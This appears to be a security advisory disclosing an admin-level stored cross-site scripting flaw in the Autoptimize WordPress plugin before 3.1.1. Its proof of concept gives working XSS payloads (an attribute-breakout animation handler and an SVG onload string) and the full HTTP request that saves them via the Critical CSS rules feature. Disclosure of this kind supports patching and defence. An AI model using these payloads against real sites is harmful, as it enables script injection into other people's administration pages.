## WordPress Plugin Vulnerabilities

# Autoptimize < 3.1.1 - Admin+ Stored Cross Site Scripting

### Description

The plugin does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered\_html capability is disallowed (for example in multisite setup)

### Proof of Concept

Create a new Critical CSS rule (/wp-admin/options-general.php?page=ao\_critcss) and add the following payload to Path value: " style=animation-name:rotation onanimationstart=alert(/XSS/)//
POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: \*/\*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 254
Connection: close
Cookie: [admin+]
action=ao\_ccss\_saverules&ao\_ccss\_saverules\_nonce=56b7a003c7&critcssrules=%7b%22paths%22%3a%7b%22%5c%22%20style%3danimation-name%3arotation%20onanimationstart%3dalert(%2fXSS%2f)%2f%2f%22%3a%7b%22hash%22%3a0%2c%22file%22%3a0%7d%7d%2c%22types%22%3a%7b%7d%7d
The form is also vulnerable when creating a conditional tag by adding the following payload (Fixed in 3.1.0): {html:background:url("</style><svg+onload='alert(1)'/>")}
The xSS will be triggered when accessing the Critical CSS settings again
